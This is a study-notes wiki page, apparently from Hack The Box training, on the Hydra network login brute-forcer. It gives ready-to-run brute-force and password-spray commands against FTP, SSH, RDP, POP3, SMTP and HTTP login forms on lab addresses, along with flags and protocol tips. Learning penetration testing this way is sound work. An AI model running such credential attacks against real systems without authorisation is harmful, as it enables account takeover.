---
tags: [tool, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Hydra

Fast, flexible network login brute-forcer supporting 50+ protocols including HTTP, FTP, SSH, SMB, RDP, POP3, IMAP, SMTP.

## Overview

Hydra is the standard brute-force tool in most HTB walkthroughs and real engagements. It is highly parallel and has broad protocol support. For RDP specifically, use `-t 4` — RDP throttles parallel connections.

## Installation

```bash
apt install hydra
```

## Common usage

```bash
# FTP single user
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.129.203.7

# SSH username list
hydra -L users.txt -p 'Password123' ssh://10.129.203.7

# RDP password spray (single password, user list)
hydra -L users.txt -p 'password123' -t 4 rdp://10.129.14.128

# POP3 (email access)
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f pop3://10.129.14.128

# SMTP auth
hydra -L users.txt -p 'HTBRocks!' -f smtp://10.129.14.128

# HTTP POST login form
hydra -l admin -P passwords.txt 10.129.203.7 http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

## Common flags

| Flag | Description |
|------|-------------|
| `-l <user>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-f` | Stop after first valid credential |
| `-t <n>` | Parallel tasks per host (default 16; use 4 for RDP) |
| `-s <port>` | Non-default port |
| `-e nsr` | Try null, same-as-user, reversed-user passwords |
| `-o <file>` | Write results to file |
| `-v` | Verbose output |
| `-V` | Show each attempt |

## Protocol-specific notes

| Protocol | Notes |
|----------|-------|
| `rdp` | Use `-t 4`; module is experimental but functional |
| `smtp` | Use `smtp-enum` for user enumeration instead |
| `pop3` | Works well for post-enumeration credential testing |
| `http-post-form` | Requires manual inspection of the login form |

## Gotchas & notes

- Hydra's `rdp` module is experimental; [[tools/crowbar]] is more reliable for RDP-specific spraying
- For FTP, [[tools/medusa]] has a more stable module
- Always check lockout policy before running; `-f` prevents excess attempts once found
- `http-post-form` format: `"/path:POST_body:failure_string"` — the failure string is what appears on a bad login

## Related pages

- [[attack/smtp]]
- [[attack/rdp]]
- [[attack/ftp]]
- [[tools/medusa]]
- [[tools/crowbar]]
- [[wordlists/use_cases]]

## Sources

- raw/attacking_common_services/smtp_attacking_email_services.md
- raw/attacking_common_services/rdp_attacking_rdp.md
